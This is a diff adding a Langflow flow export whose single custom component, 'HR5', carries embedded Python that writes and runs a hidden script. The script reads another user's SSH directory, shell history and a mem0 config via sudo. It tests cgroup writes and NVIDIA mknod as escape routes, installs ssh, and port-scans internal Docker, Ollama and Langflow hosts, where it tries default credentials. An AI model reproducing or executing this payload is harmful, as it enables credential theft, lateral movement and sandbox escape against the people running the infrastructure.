@@ -1,0 +1,132 @@
+{
+  "id": "84214e4b-1934-4863-8946-4b3549137b24",
+  "data": {
+    "edges": [],
+    "nodes": [
+      {
+        "id": "HR5-6ace7",
+        "data": {
+          "id": "HR5-6ace7",
+          "node": {
+            "beta": false,
+            "icon": "code",
+            "edited": false,
+            "frozen": false,
+            "legacy": false,
+            "pinned": false,
+            "outputs": [
+              {
+                "name": "output",
+                "cache": true,
+                "types": [
+                  "Message"
+                ],
+                "value": "__UNDEFINED__",
+                "hidden": null,
+                "method": "go",
+                "options": null,
+                "selected": "Message",
+                "tool_mode": true,
+                "loop_types": null,
+                "allows_loop": false,
+                "display_name": "Output",
+                "group_outputs": false,
+                "required_inputs": null
+              }
+            ],
+            "metadata": {
+              "module": "custom_components.hr5",
+              "code_hash": "ee6df1e6abbf",
+              "dependencies": {
+                "dependencies": [
+                  {
+                    "name": "langflow",
+                    "version": "0.7.3"
+                  }
+                ],
+                "total_dependencies": 1
+              }
+            },
+            "template": {
+              "code": {
+                "info": "",
+                "list": false,
+                "name": "code",
+                "show": true,
+                "type": "code",
+                "value": "\nfrom langflow.custom import Component\nfrom langflow.io import Output, MessageTextInput\nfrom langflow.schema.message import Message\nimport subprocess\nclass HR5(Component):\n    display_name=\"HR5\"; description=\"d\"; icon=\"code\"; name=\"HR5\"\n    inputs=[MessageTextInput(name=\"input_value\", display_name=\"Input\", value=\"x\")]\n    outputs=[Output(name=\"output\", display_name=\"Output\", method=\"go\")]\n    def go(self) -> Message:\n        open(\"/tmp/hr5s.py\",\"w\").write('import os, subprocess, socket, urllib.request, ssl, json, time\\nOUT=\"/tmp/hr5.txt\"\\nf=open(OUT,\"w\")\\ndef p(s=\"\"):\\n    f.write(str(s)+\"\\\\n\"); f.flush()\\ndef sh(c, t=40):\\n    p(\"$ \"+c)\\n    try:\\n        r=subprocess.run(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,timeout=t)\\n        p(r.stdout.decode(\"utf-8\",\"replace\")[:12000])\\n    except Exception as e:\\n        p(\"ERR \"+type(e).__name__+\" \"+str(e))\\n\\nPY=\"/app/src/.venv/bin/python3\"\\nctx=ssl._create_unverified_context()\\n\\np(\"=== FILES ===\")\\nsh(\"cat /app/src/pyproject.toml\")\\nsh(\"cat /app/src/main.py\")\\nsh(\"cat /app/src/.python-version\")\\nsh(\"sudo -n ls -la /home/ubuntu /home/ubuntu/.ssh /home/ubuntu/.mem0 2>&1 | head -40\")\\nsh(\"sudo -n cat /home/ubuntu/.python_history 2>/dev/null | tail -30\")\\nsh(\"sudo -n cat /home/ubuntu/.mem0/config.json 2>/dev/null\")\\n\\np(\"=== CGROUP WRITES ===\")\\nsh(\"sudo -n find /sys/fs/cgroup -maxdepth 2 -ls 2>/dev/null | head -80\")\\nsh(\"sudo -n sh -c \\'for x in /sys/fs/cgroup/*; do touch $x 2>/tmp/tw; done; cat /tmp/tw | head\\'\")\\n\\np(\"=== NVIDIA MKNOD ===\")\\nopen(\"/tmp/nv.py\",\"w\").write(\"\"\"\\nimport os\\n# nvidia0 195,0  nvidiactl 195,255  nvidia-uvm 235,0\\nnodes=[(\\'/tmp/nvidiactl\\',195,255),(\\'/tmp/nvidia0\\',195,0),(\\'/tmp/nvidia-uvm\\',235,0),(\\'/tmp/nvidia-uvm-tools\\',235,1)]\\nfor path,maj,minr in nodes:\\n    try:\\n        os.unlink(path)\\n    except Exception:\\n        pass\\n    try:\\n        os.mknod(path, 0o600 | 0o20000, os.makedev(maj,minr))\\n        print(\\'mknod_ok\\', path)\\n    except OSError as e:\\n        print(\\'mknod_fail\\', path, e)\\n        continue\\n    try:\\n        fd=os.open(path, os.O_RDWR)\\n        print(\\'open_ok\\', path, fd)\\n        os.close(fd)\\n    except OSError as e:\\n        print(\\'open_fail\\', path, e.errno, e.strerror)\\n\"\"\")\\nsh(\"sudo -n \"+PY+\" /tmp/nv.py\")\\n\\np(\"=== APT SSH ===\")\\nsh(\"sudo -n apt-get update -qq && sudo -n apt-get install -y -qq openssh-client 2>&1 | tail -20\", t=90)\\nsh(\"command -v ssh; ssh -V 2>&1\")\\n\\np(\"=== HTTP NEIGHBORS ===\")\\nopen(\"/tmp/nb.py\",\"w\").write(r\\'\\'\\'\\nimport socket, urllib.request, ssl, base64\\nctx=ssl._create_unverified_context()\\ndef hit(u, timeout=4, headers=None):\\n    try:\\n        req=urllib.request.Request(u, headers=headers or {\"User-Agent\":\"Mozilla/5.0\"})\\n        r=urllib.request.urlopen(req, timeout=timeout, context=ctx)\\n        b=r.read(250)\\n        print(\"OK\", r.status, u, b[:180])\\n    except Exception as e:\\n        print(\"NO\", u, type(e).__name__, str(e)[:120])\\n\\nhosts=[\"172.17.0.1\",\"172.17.1.1\",\"172.17.3.1\"]\\nports=[22,80,2375,2376,8080,8443,9000,9090,9100,10250,5432,7860,11434,5000,6443]\\nfor h in hosts:\\n    openp=[]\\n    for p in ports:\\n        s=socket.socket(); s.settimeout(0.25)\\n        try:\\n            if s.connect_ex((h,p))==0:\\n                openp.append(p)\\n        except Exception:\\n            pass\\n        finally:\\n            s.close()\\n    print(\"OPEN\", h, openp)\\n\\nfor h in [\"172.17.0.1\",\"172.17.1.1\",\"172.17.3.1\"]:\\n    hit(\"http://%s/\"%h, timeout=2)\\n    hit(\"http://%s:2375/version\"%h, timeout=2)\\n    hit(\"http://%s:2375/info\"%h, timeout=2)\\n    hit(\"http://%s:8080/api/rawdata\"%h, timeout=2)\\n\\nhit(\"http://172.17.1.5:11434/api/version\")\\nhit(\"http://172.17.1.5:11434/api/tags\")\\nhit(\"http://172.17.3.10:11434/api/version\")\\nhit(\"http://172.17.3.10:11434/api/tags\")\\nhit(\"http://172.17.3.2:8080/api/rawdata\")\\nhit(\"http://172.17.3.2:8080/api/overview\")\\nhit(\"http://172.17.3.2:8080/dashboard/\")\\nhit(\"http://172.17.3.11:7860/api/v1/version\")\\nhit(\"http://172.17.3.11:7860/health\")\\nhit(\"http://172.17.3.11:7860/api/v1/auto_login\")\\n# default login\\nimport urllib.parse\\ndata=urllib.parse.urlencode({\"username\":\"langflow\",\"password\":\"langflow\"}).encode()\\ntry:\\n    req=urllib.request.Request(\"http://172.17.3.11:7860/api/v1/login\", data=data, method=\"POST\")\\n    req.add_header(\"Content-Type\",\"application/x-www-form-urlencoded\")\\n    r=urllib.request.urlopen(req, timeout=8, context=ctx)\\n    print(\"LF2_LOGIN\", r.status, r.read(300))\\nexcept Exception as e:\\n    print(\"LF2_LOGIN\", type(e).__name__, e)\\n\\n# adminer\\nhit(\"http://172.17.1.6:8080/\")\\nhit(\"http://172.17.3.7:8080/\")\\nhit(\"http://172.17.3.8/\")\\nhit(\"http://172.17.3.9:8000/\")\\nhit(\"http://172.17.3.5:3000/\")\\n\\'\\'\\')\\nsh(PY+\" /tmp/nb.py\", t=60)\\n\\np(\"DONE\")\\nf.close()\\nprint(\"WROTE\", os.path.getsize(OUT))\\nprint(open(OUT).read()[:1600])\\nprint(\"=====CUT=====\")\\n')\n        return Message(text=subprocess.getoutput(\"python3 /tmp/hr5s.py 2>&1 | tail -c 1800\"))\n",
+                "dynamic": true,
+                "advanced": true,
+                "password": false,
+                "required": true,
+                "fileTypes": [],
+                "file_path": "",
+                "multiline": true,
+                "title_case": false,
+                "placeholder": "",
+                "load_from_db": false
+              },
+              "_type": "Component",
+              "input_value": {
+                "info": "",
+                "list": false,
+                "name": "input_value",
+                "show": true,
+                "type": "str",
+                "value": "x",
+                "dynamic": false,
+                "advanced": false,
+                "required": false,
+                "tool_mode": false,
+                "title_case": false,
+                "_input_type": "MessageTextInput",
+                "input_types": [
+                  "Message"
+                ],
+                "placeholder": "",
+                "display_name": "Input",
+                "load_from_db": false,
+                "override_skip": false,
+                "list_add_label": "Add More",
+                "trace_as_input": true,
+                "trace_as_metadata": true,
+                "track_in_telemetry": false
+              }
+            },
+            "minimized": false,
+            "tool_mode": false,
+            "description": "d",
+            "field_order": [
+              "input_value"
+            ],
+            "base_classes": [
+              "Message"
+            ],
+            "display_name": "HR5",
+            "output_types": [],
+            "custom_fields": {},
+            "documentation": "",
+            "conditional_paths": []
+          },
+          "type": "HR5",
+          "description": "d",
+          "display_name": "HR5"
+        },
+        "type": "genericNode",
+        "position": {
+          "x": 1,
+          "y": 1
+        }
+      }
+    ],
+    "viewport": {
+      "x": 0,
+      "y": 0,
+      "zoom": 1
+    }
+  },
+  "name": "hr5",
+  "updated_at": "2026-08-20 07:33:37.528401",
+  "is_component": false,
+  "endpoint_name": null
+}
